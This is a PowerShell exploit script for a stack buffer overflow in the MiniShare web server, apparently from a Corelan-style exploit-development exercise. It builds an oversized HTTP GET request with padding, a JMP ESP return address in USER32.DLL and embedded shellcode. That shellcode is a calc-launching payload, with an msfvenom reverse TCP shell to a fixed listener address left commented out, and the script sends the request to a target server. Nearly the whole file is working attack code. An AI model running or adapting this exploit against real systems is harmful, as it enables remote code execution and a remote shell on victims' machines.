<#
Last changed:  2015/02/28

powershell -ep bypass -f exploit-minishare04.ps1

??? Test [System.Array]::Reverse($LittleEndianByteArray)
#>
param (
	[string]$RemoteServer = "192.168.200.11",
	[int]$RemotePort = 80,
	[int]$bufferSize = 1787
)



## https://raw.githubusercontent.com/nickvido/littleoldearthquake/master/corelan/exploit-tutorial-pt01/win-exec-calc-shellcode-hex
[Byte[]]$calcExe = 0x31,0xc9,0x49,0x31,0xd2,0xe3,0x47,0x52,0x68,0x63,0x61,0x6c,0x63,0x89,0xe6,0x52
$calcExe +=        0x56,0x64,0x8b,0x72,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x0c,0xad,0x8b,0x30,0x8b,0x7e
$calcExe +=		   0x18,0x8b,0x5f,0x3c,0x8b,0x5c,0x1f,0x78,0x8b,0x74,0x1f,0x20,0x01,0xfe,0x8b,0x4c
$calcExe +=        0x1f,0x24,0x01,0xf9,0x0f,0xb7,0x2c,0x51,0x42,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e
$calcExe +=        0x45,0x75,0xf1,0x8b,0x74,0x1f,0x1c,0x01,0xfe,0x03,0x3c,0xae,0xff,0xd7,0x6a,0x60
$calcExe +=        0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x83,0xec,0x28,0x65,0x48,0x8b,0x32
$calcExe +=        0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e
$calcExe +=        0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b
$calcExe +=        0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69
$calcExe +=        0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01
$calcExe +=        0xf7,0x99,0xff,0xd7



###  REVERSE NETCAT 
###  msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.101.100 LPORT=6666 -b '\x00\x0d' -n 10 -f powershell -v reverseNetcat
[Byte[]]$reverseNetcat = 0x91,0x2f,0x27,0x37,0x90,0x42,0xf5,0x43,0x2f,0x37
$reverseNetcat += 0xdd,0xc5,0xbd,0xb4,0x8f,0x70,0x53,0xd9,0x74,0x24
$reverseNetcat += 0xf4,0x5a,0x29,0xc9,0xb1,0x52,0x31,0x6a,0x17,0x83
$reverseNetcat += 0xc2,0x4,0x3,0xde,0x9c,0x92,0xa6,0xe2,0x4b,0xd0
$reverseNetcat += 0x49,0x1a,0x8c,0xb5,0xc0,0xff,0xbd,0xf5,0xb7,0x74
$reverseNetcat += 0xed,0xc5,0xbc,0xd8,0x2,0xad,0x91,0xc8,0x91,0xc3
$reverseNetcat += 0x3d,0xff,0x12,0x69,0x18,0xce,0xa3,0xc2,0x58,0x51
$reverseNetcat += 0x20,0x19,0x8d,0xb1,0x19,0xd2,0xc0,0xb0,0x5e,0xf
$reverseNetcat += 0x28,0xe0,0x37,0x5b,0x9f,0x14,0x33,0x11,0x1c,0x9f
$reverseNetcat += 0xf,0xb7,0x24,0x7c,0xc7,0xb6,0x5,0xd3,0x53,0xe1
$reverseNetcat += 0x85,0xd2,0xb0,0x99,0x8f,0xcc,0xd5,0xa4,0x46,0x67
$reverseNetcat += 0x2d,0x52,0x59,0xa1,0x7f,0x9b,0xf6,0x8c,0x4f,0x6e
$reverseNetcat += 0x6,0xc9,0x68,0x91,0x7d,0x23,0x8b,0x2c,0x86,0xf0
$reverseNetcat += 0xf1,0xea,0x3,0xe2,0x52,0x78,0xb3,0xce,0x63,0xad
$reverseNetcat += 0x22,0x85,0x68,0x1a,0x20,0xc1,0x6c,0x9d,0xe5,0x7a
$reverseNetcat += 0x88,0x16,0x8,0xac,0x18,0x6c,0x2f,0x68,0x40,0x36
$reverseNetcat += 0x4e,0x29,0x2c,0x99,0x6f,0x29,0x8f,0x46,0xca,0x22
$reverseNetcat += 0x22,0x92,0x67,0x69,0x2b,0x57,0x4a,0x91,0xab,0xff
$reverseNetcat += 0xdd,0xe2,0x99,0xa0,0x75,0x6c,0x92,0x29,0x50,0x6b
$reverseNetcat += 0xd5,0x3,0x24,0xe3,0x28,0xac,0x55,0x2a,0xef,0xf8
$reverseNetcat += 0x5,0x44,0xc6,0x80,0xcd,0x94,0xe7,0x54,0x41,0xc4
$reverseNetcat += 0x47,0x7,0x22,0xb4,0x27,0xf7,0xca,0xde,0xa7,0x28
$reverseNetcat += 0xea,0xe1,0x6d,0x41,0x81,0x18,0xe6,0x64,0x5c,0x47
$reverseNetcat += 0x92,0x10,0x62,0x87,0x40,0xeb,0xeb,0x61,0x1e,0xfb
$reverseNetcat += 0xbd,0x3a,0xb7,0x62,0xe4,0xb0,0x26,0x6a,0x32,0xbd
$reverseNetcat += 0x69,0xe0,0xb1,0x42,0x27,0x1,0xbf,0x50,0xd0,0xe1
$reverseNetcat += 0x8a,0xa,0x77,0xfd,0x20,0x22,0x1b,0x6c,0xaf,0xb2
$reverseNetcat += 0x52,0x8d,0x78,0xe5,0x33,0x63,0x71,0x63,0xae,0xda
$reverseNetcat += 0x2b,0x91,0x33,0xba,0x14,0x11,0xe8,0x7f,0x9a,0x98
$reverseNetcat += 0x7d,0x3b,0xb8,0x8a,0xbb,0xc4,0x84,0xfe,0x13,0x93
$reverseNetcat += 0x52,0xa8,0xd5,0x4d,0x15,0x2,0x8c,0x22,0xff,0xc2
$reverseNetcat += 0x49,0x9,0xc0,0x94,0x55,0x44,0xb6,0x78,0xe7,0x31
$reverseNetcat += 0x8f,0x87,0xc8,0xd5,0x7,0xf0,0x34,0x46,0xe7,0x2b
$reverseNetcat += 0xfd,0x76,0xa2,0x71,0x54,0x1f,0x6b,0xe0,0xe4,0x42
$reverseNetcat += 0x8c,0xdf,0x2b,0x7b,0xf,0xd5,0xd3,0x78,0xf,0x9c
$reverseNetcat += 0xd6,0xc5,0x97,0x4d,0xab,0x56,0x72,0x71,0x18,0x56
$reverseNetcat += 0x57



###  EIP  address to JMP ESP in USER32.DLL 0x773B24DA
[byte[]]$EIP = 0xda, 0x24, 0x3b, 0x77

[byte[]]$shellCode = $calcExe
#[byte[]]$shellCode = $reverseNetcat


$Bytes = $null
$Bytes += ([system.Text.Encoding]::UTF8).GetBytes("GET ")               
$Bytes += ([system.Text.Encoding]::UTF8).GetBytes($("A"*$bufferSize))      ###  'A' * 1787
$Bytes += $EIP                                                             ###  0x773B24DA
$Bytes += $shellCode                                                       ###  Shellcode 
$Bytes += ([system.Text.Encoding]::UTF8).GetBytes($("C" * 100))
$Bytes += ([system.Text.Encoding]::UTF8).GetBytes(" HTTP 1/1 `r`n`r`n")


Write-Host  "[+] Connecting with remote web server on: $($RemoteServer):$($RemotePort)" -foregroundcolor DarkGreen
Write-Host  "[+] Evil Buffer Size: $bufferSize" -foregroundcolor DarkGreen
3..0 | % { $EIP_addr += ("{0:X2} " -f $EIP[$_]) } 
Write-Host  "[+] EIP: $EIP_addr" -foregroundcolor DarkGreen 


$Socket = New-Object System.Net.Sockets.TCPClient($RemoteServer, $RemotePort) 
$Stream = $Socket.GetStream() 
$Stream.Write($Bytes,0,$Bytes.length)
$Stream.Close()
$Socket.Close()

Write-Host  "[+] BOF done ..." -foregroundcolor DarkGreen
